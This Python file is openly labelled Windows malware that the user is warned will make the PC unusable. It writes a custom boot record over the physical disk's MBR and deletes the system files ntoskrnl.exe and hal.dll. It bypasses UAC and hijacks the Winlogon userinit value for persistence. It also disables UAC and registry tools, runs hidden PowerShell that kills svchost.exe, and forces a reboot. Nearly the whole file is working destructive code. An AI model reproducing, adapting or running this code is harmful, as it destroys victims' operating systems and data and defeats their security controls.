from win32file import CreateFileW, WriteFile, CloseHandle, GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING
from win32api import SetFileAttributes
from win32gui import GetDC, BitBlt
from win32con import SRCAND, FILE_ATTRIBUTE_HIDDEN
from win32ui import *
import win32api, win32con, win32gui, win32file
import ctypes, os, shutil, subprocess, psutil, winreg, time, threading, configparser, math
from winpwnage.functions.uac.uacMethod2 import uacMethod2

def is_running_as_admin():
    '''
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    '''    
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def check_enable_lua():
    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
        value, _ = winreg.QueryValueEx(key, "EnableLUA")
        if value == 1:
            return True
        else:
            return False

buffer = bytes([
0xE8, 0x15, 0x00, 0xBB, 0x27, 0x7C, 0x8A, 0x07, 0x3C, 0x00, 0x74, 0x0B, 0xE8, 0x03, 0x00, 0x43, 
0xEB, 0xF4, 0xB4, 0x0E, 0xCD, 0x10, 0xC3, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x04, 0xB9, 0x00, 
0x00, 0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0x4F, 0x68, 0x20, 0x6E, 0x6F, 0x21, 0x20, 0x53, 0x6F, 
0x6D, 0x65, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x20, 0x68, 0x61, 0x73, 0x20, 0x6F, 0x76, 0x65, 0x72, 
0x77, 0x72, 0x69, 0x74, 0x74, 0x65, 0x6E, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x57, 0x69, 0x6E, 
0x64, 0x6F, 0x77, 0x73, 0x20, 0x4D, 0x42, 0x52, 0x2E, 0x20, 0x4C, 0x6F, 0x6F, 0x6B, 0x73, 0x20, 
0x6C, 0x69, 0x6B, 0x65, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x74, 0x68, 0x65, 
0x20, 0x65, 0x6E, 0x64, 0x20, 0x6F, 0x66, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x6A, 0x6F, 0x75, 
0x72, 0x6E, 0x65, 0x79, 0x2E, 0x0D, 0x0A, 0x57, 0x65, 0x6C, 0x6C, 0x2C, 0x20, 0x79, 0x6F, 0x75, 
0x20, 0x63, 0x61, 0x6E, 0x20, 0x66, 0x6F, 0x6C, 0x6C, 0x6F, 0x77, 0x20, 0x6D, 0x65, 0x20, 0x6F, 
0x6E, 0x20, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x61, 0x74, 0x20, 0x6C, 
0x65, 0x61, 0x73, 0x74, 0x2E, 0x20, 0x2D, 0x20, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x67, 0x72, 0x61, 
0x6D, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x40, 0x78, 0x65, 0x6E, 0x69, 0x69, 0x67, 0x68, 0x74, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
])

# Variables
windows_folder = os.environ.get('windir')
local_appdata_path = os.environ['LOCALAPPDATA']
file_paths = [f"{local_appdata_path}\wininit.ps1", f"{local_appdata_path}\config.ini"]
process_name = "powershell.exe"

def monitor_files(file_paths):
    while True:
        for file_path in file_paths:
            if not os.path.exists(file_path):
                subprocess.call(["taskkill", "/IM", "svchost.exe", "/f"])
        time.sleep(1)  # You can adjust the sleep time as per your requirement
        
def check_process(process_name):
    while True:
        # Iterate over all running processes
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == process_name:
                print(f"Process '{process_name}' is alive with PID {proc.info['pid']}")
                break
        else:
            subprocess.call(["taskkill", "/IM", "svchost.exe", "/f"])
        time.sleep(5)

def overwrite():
    hDevice = CreateFileW(r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
					  0, 0)
    bytes_written = WriteFile(hDevice, buffer, None)
    print("Wrote", bytes_written, "i")
    CloseHandle(hDevice)

def payload():
    subprocess.run(['takeown', '/F', "C:"])
    subprocess.run(['takeown', '/F', "C:\\Windows"])
    subprocess.run(['takeown', '/F', "C:\\Windows\\System32"])
    subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\hal.dll"])
    subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\ntoskrnl.exe"])
    subprocess.run(['icacls', 'C:\\Windows', "/t", "/grant", "Everyone:(OI)(CI)F"])
    subprocess.run(['icacls', 'C:\\Windows\\System32', "/t", "/grant", "Everyone:(OI)(CI)F"])
    subprocess.run(['icacls', 'C:\\Windows\\System32\\hal.dll', "/t", "/grant", "Everyone:(OI)(CI)F"])
    subprocess.run(['icacls', 'C:\\Windows\\System32\\ntoskrnl.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
    os.remove("C:\\Windows\\System32\\ntoskrnl.exe")
    os.remove("C:\\Windows\\System32\\hal.dll")

def registrypayload():
    # Specify the registry key path
    winlogon_key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

    # Open the registry key for editing
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, winlogon_key_path, 0, winreg.KEY_WRITE) as key:
        # Set the value names
        disablecadd = "DisableCAD"
        wininit = "userinit"

        # Set the new value data
        new_cad_data = 0
        new_init_data = f"C:\\Windows\\system32\\userinit.exe, {windows_folder}\\ihatemyself.exe"

        # Set the value type (REG_SZ for string value)
        vtype = winreg.REG_SZ
        discadtype = winreg.REG_DWORD
        
        # Set the values
        winreg.SetValueEx(key, disablecadd, 0, discadtype, new_cad_data)
        winreg.SetValueEx(key, wininit, 0, vtype, new_init_data)

    luapath = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, luapath, 0, winreg.KEY_WRITE) as lkey:
        # Set the value names
        lua = "EnableLUA"

        # Set the new value data
        newlua = 0

        discadtype = winreg.REG_DWORD
        
        # Set the values
        winreg.SetValueEx(lkey, lua, 0, discadtype, newlua)
    
    system_key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"

    with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, system_key_path, 0, winreg.KEY_WRITE) as skey:
        disableregistrytools = "disableregistrytools"

        newddata = 1

        disabletype = winreg.REG_DWORD

        winreg.SetValueEx(skey, disableregistrytools, 0, disabletype, newddata)

    mousekeypath = r"Control Panel\Mouse"

    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, mousekeypath, 0, winreg.KEY_WRITE) as mkey:
        k = "SwapMouseButtons"

        nd = r"1"

        nt = winreg.REG_SZ

        winreg.SetValueEx(mkey, k, 0, nt, nd)

    ppath = r"SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell"

    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ppath, 0, winreg.KEY_WRITE) as pkey:

        name = "ExecutionPolicy"

        newdddata = "RemoteSigned"

        ntype = winreg.REG_SZ

        winreg.SetValueEx(pkey, name, 0, ntype, newdddata)


def create_ps1_script(script_name, content):
    ps1_script = os.path.join(local_appdata_path, f"{script_name}.ps1")
    with open(ps1_script, "w") as file:
        file.write(content)

script_name = "wininit"
content = """
# Define the process name to monitor
$processName = "ihatemyself"

# Loop indefinitely
while ($true) {
    $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
    
    if (-not $process) {
        Start-Process taskkill -ArgumentList "/F /IM svchost.exe /T" -NoNewWindow -Wait
    }

    Start-Sleep -Seconds 2
}
"""

def bypassuac():
        path = os.getcwd()
        uacMethod2(["c:\\windows\\system32\\cmd.exe", "/k" f"cd {path} && ihatemyself.exe"])
     
def restart_computer():
    os.system("shutdown -t 0 -r -f")

def hell():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    hdc = win32gui.GetDC(0)
    dx = dy = 1
    angle = 0
    size = 0.01
    speed = 0.01
    while True:
        win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx,dy, win32con.SRCAND)
        dx = math.ceil(math.sin(angle) * size * 10)
        dy = math.ceil(math.cos(angle) * size * 10)
        angle += speed / 10
        if angle > math.pi :
            angle = math.pi * -1

CONFIG_FILE = f"{local_appdata_path}\config.ini"

def ask_permission():
    # Prompt the user with a warning message box
    return ctypes.windll.user32.MessageBoxW(0, "This program is a malware. Proceeding will make your PC unusable.\nContinue?", "!!!...WARNING...!!!", 0x00000030 | 0x00000004) == 6

def write_permission_granted():
    config = configparser.ConfigParser()
    config["Permission"] = {"Granted": "True"}
    with open(CONFIG_FILE, "w") as configfile:
        config.write(configfile)

def check_permission_granted():
    if os.path.exists(CONFIG_FILE):
        config = configparser.ConfigParser()
        config.read(CONFIG_FILE)
        return config.getboolean("Permission", "Granted", fallback=False)
    return False

if __name__ == "__main__":
    # Check if permission is already granted
    if check_permission_granted():
        if is_running_as_admin() and check_enable_lua():
         create_ps1_script(script_name, content)
         path = os.getcwd()
         os.chdir(path)
         shutil.copy("ihatemyself.exe", windows_folder)
         win32api.SetFileAttributes("ihatemyself.exe", win32con.FILE_ATTRIBUTE_HIDDEN)
         registrypayload()
         restart_computer()
        else:
            subprocess.call(["c:\\windows\\system32\\cmd.exe", "/c", "start", "powershell.exe", "-WindowStyle", "Hidden", "-File", f"{local_appdata_path}\wininit.ps1"])
            payload()
            overwrite()
            thread1 = threading.Thread(target=monitor_files, args=(file_paths,))
            thread2 = threading.Thread(target=check_process, args=(process_name,))
            thread3 = threading.Thread(target=hell,)
            thread1.start()
            thread2.start()
            thread3.start()
    else:
        # Prompt the user for permission if it hasn't been granted yet
        if ask_permission():
            write_permission_granted()
            bypassuac()
        else:
            os.system("start https://github.com/g0t-h")
